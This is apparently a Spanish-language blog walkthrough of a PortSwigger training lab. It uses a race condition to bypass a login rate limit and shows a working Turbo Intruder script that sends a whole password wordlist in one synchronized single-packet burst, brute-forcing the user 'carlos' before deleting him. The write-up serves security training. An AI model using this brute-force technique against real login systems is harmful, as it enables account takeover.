---
title: Bypassing rate limits via race conditions
description: Laboratorio de Portswigger sobre Race Conditions
date: 2025-03-22 12:26:00 +0800
lang: es-ES
author: Justice-Reaper
categories:
  - Portswigger Labs
  - Race Conditions
tags:
  - Portswigger Labs
  - Race Conditions
  - Bypassing rate limits via race conditions
image:
  path: /assets/img/Portswigger/Portswigger.png
---

## Certificaciones

- eWPT
- eWPTXv2
- OSWE
- BSCP
  
## Descripción

Este `laboratorio` utiliza un mecanismo de `inicio de sesión` que implementa una `limitación de velocidad` para defenderse contra `ataques de fuerza bruta`. Sin embargo, esta protección puede ser `eludida` debido a una `race condition`

Para `resolver` el laboratorio

- Identificar cómo `explotar` la `race condition` para `eludir` la `limitación de velocidad`
    
- Realizar un ataque de `fuerza bruta` con éxito para `descubrir` la `contraseña` del usuario `carlos`
    
- `Iniciar sesión` en la cuenta de `carlos` y `acceder` al `panel de administración`
    
- `Eliminar` al usuario `carlos`
    
Podemos `iniciar sesión` en nuestra propia cuenta utilizando las credenciales `wiener:peter`. Como `diccionario` de `contraseñas` podemos usar [https://portswigger.net/web-security/authentication/auth-lab-passwords](https://portswigger.net/web-security/authentication/auth-lab-passwords)

---

## Guía de race conditions

`Antes` de `completar` este `laboratorio` es recomendable `leerse` esta `guía de race conditions` [https://justice-reaper.github.io/posts/Race-Conditions-Guide/](https://justice-reaper.github.io/posts/Race-Conditions-Guide/)

## Resolución

Al `acceder` a la `web` vemos esto

![](/assets/img/Race-Conditions-Lab-2/image_1.png)

Si hacemos click sobre `My account`, vemos un `panel` de `login`. Si hacemos `demasiados intentos fallidos` nos `arroja` este `mensaje`

![](/assets/img/Race-Conditions-Lab-2/image_2.png)

En nuestro caso, nos podemos`loguear` con las credenciales `wiener:peter`

![](/assets/img/Race-Conditions-Lab-2/image_3.png)

Si `capturamos` la `petición` que se hace a la `hora` de `iniciar sesión` vemos esto

![](/assets/img/Race-Conditions-Lab-2/image_4.png)

Para `mandar` esta `petición` al `Turbo Intruder` debemos pulsar `click derecho > Extension > Turbo Intruder > Send to turbo intruder`

![](/assets/img/Race-Conditions-Lab-2/image_5.png)

Seleccionamos como script el `race-single-packet-attack`

![](/assets/img/Race-Conditions-Lab-2/image_6.png)

El siguiente paso es `crearnos` un `archivo` que contenga todas las `contraseñas` del diccionario [https://portswigger.net/web-security/authentication/auth-lab-passwords](https://portswigger.net/web-security/authentication/auth-lab-passwords). Posteriormente debemos `marcar` donde queremos que ejerza la `fuerza bruta` usando `%s`

![](/assets/img/Race-Conditions-Lab-2/image_7.png)

Por último, `modificamos` el `script` por defecto para `cargar` un `diccionario` e `iniciamos` el `ataque`

```
def queueRequests(target, wordlists):

    # If the target supports HTTP/2, use engine=Engine.BURP2 to trigger the single-packet attack
    # If they only support HTTP/1, use Engine.THREADED or Engine.BURP instead
    # For more information, check out https://portswigger.net/research/smashing-the-state-machine
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           engine=Engine.BURP2
                           )

    # Load the wordlist
    wordlist_path = "/home/justice-reaper/Desktop/passwords.txt"
    with open(wordlist_path, 'r') as file:
        passwords = file.readlines()

    # Clean the words (remove line breaks)
    passwords = [password.strip() for password in passwords]

    # The 'gate' argument withholds part of each request until openGate is invoked
    # If you see a negative timestamp, the server responded before the request was complete
    for password in passwords:
        engine.queue(target.req, password, gate='race1')

    # Once every 'race1' tagged request has been queued
    # Invoke engine.openGate() to send them in sync
    engine.openGate('race1')


def handleResponse(req, interesting):
    table.add(req)
```

Si `filtramos` por `Length` vemos que nos hace un `redirect`, lo cual significa que la `contraseña` es `válida`

![](/assets/img/Race-Conditions-Lab-2/image_8.png)

Nos `logueamos` con las credenciales `carlos:letmein`

![](/assets/img/Race-Conditions-Lab-2/image_9.png)

![](/assets/img/Race-Conditions-Lab-2/image_10.png)

Pulsamos sobre `Admin panel` y `eliminamos` al usuario `carlos`

![](/assets/img/Race-Conditions-Lab-2/image_11.png)
